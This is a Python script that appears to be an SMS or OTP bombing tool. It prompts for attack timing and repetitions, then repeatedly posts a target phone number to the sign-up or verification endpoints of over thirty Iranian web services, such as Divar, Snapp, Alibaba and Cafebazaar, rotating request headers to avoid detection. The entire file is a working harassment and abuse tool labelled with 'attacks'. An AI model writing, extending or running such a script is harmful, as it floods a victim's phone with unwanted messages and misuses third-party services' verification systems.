import requests
import random
import time

######################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
######################

from Bot.data import number, in_Iran, url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_torob, url_cafebazaar, json_cafebazaar , url_gap , url_sibche , json_sibche, url_ponisha, json_ponisha, url_karlancer, json_karlancer, url_jobvision, url_komodaa, json_komodaa, url_pindo, json_pindo

attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))

sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))

i = 0





while i < numbert:
    random_head = random.choice(heads)

    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print("1-divar",req_divar)
    time.sleep(sleep_time)

    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print("2-snapp",req_snapp)
    time.sleep(sleep_time)

    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print("3-sheypoor",req_sheypoor)
    time.sleep(sleep_time)

    req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print("4-jet",req_jet)
    time.sleep(sleep_time)

    req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print("5-virgool",req_virgool)
    time.sleep(sleep_time)

    req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
    print("6-snapp_box",req_snapp_box)
    time.sleep(sleep_time)

    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
    print("7-banimode",req_banimode)
    time.sleep(sleep_time)

    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
    print("8-ostadkr",req_ostadkr)
    time.sleep(sleep_time)

    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
    print("9-drnext",req_drnext)
    time.sleep(sleep_time)

    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
    print("10-snapp_market",req_snapp_market)
    time.sleep(sleep_time)

    req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
    print("11-basalam",req_basalam)
    time.sleep(sleep_time)

    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
    print("12-buskool",req_buskool)
    time.sleep(sleep_time)

    req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
    print("13-jabama",req_jabama)
    time.sleep(sleep_time)

    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print("14-alibaba",req_alibaba)
    time.sleep(sleep_time)

    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)
    print("15-Digoon",req_digitoon)
    time.sleep(sleep_time)

    req_sibapp = requests.post(url=url_sibapp,json=json_sibapp,headers=random_head)
    print("16-Sibapp",req_sibapp)

    req_Drdr = requests.post(url=url_Drdr,json=json_Drdr,headers=random_head)
    print("17-Drdr",req_Drdr)

    req_kukala = requests.post(url=url_kukala,json=json_kukala,headers=random_head)
    print("18-kukala",req_kukala)

    req_tapsi = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
    print("19-Tapsi",req_tapsi)

    req_flightio = requests.post(url=url_flightio,json=json_flightio,headers=random_head)
    print("20-Flightio",req_flightio)

    req_football_360 = requests.post(url=url_football_360,json=json_football_360,headers=random_head)
    print("21-Football_360",req_football_360)

    req_miare = requests.post(url=url_miare,json=json_miare,headers=random_head)
    print("22-miare",req_miare)

    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
    print("23-pinket",req_pinket)

    if in_Iran == "y":
        req_torob = requests.get(url=url_torob)
        print("24_torob",req_torob)
    else:
        print("Next (24)")

    req_cafebazaar = requests.post(url=url_cafebazaar,json=json_cafebazaar,headers=random_head)
    print("25-cafebazaar",req_cafebazaar)

    req_gap = requests.post(url=url_gap,headers=random_head)
    print("26-gap",req_gap)

    req_sibche = requests.post(url=url_sibche,json=json_sibche,headers=random_head)
    print("27-sibche",req_sibche)

    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
    print("28-ponisha",req_ponisha)

    req_karlancer = requests.post(url=url_karlancer,json=json_karlancer,headers=random_head)
    print("29-karlancer",req_karlancer)

    req_jobvision = requests.post(url=url_jobvision,headers=random_head)
    print("30-jobvision",req_karlancer)

    req_komodaa = requests.post(url=url_komodaa,json=json_komodaa,headers=random_head)
    print("31-komodaa",req_komodaa)


    req_pindo = requests.post(url=url_pindo,json=json_pindo,headers=random_head)
    print("32-pindo",req_pindo)











    if i % 2 == 0:
        print(Blue + "Send all requests")
    else:
        print(yellow + "Send all requests")
    
    print("" + cyan + "[" + Red + "Number" + cyan + "]─[" + Blue + "of" + cyan + "]─[" + Green + "repetitions :" + cyan + "]" + Red + ": " + cyan + "[" + Green + str(i) + cyan + "]")

    i += 1
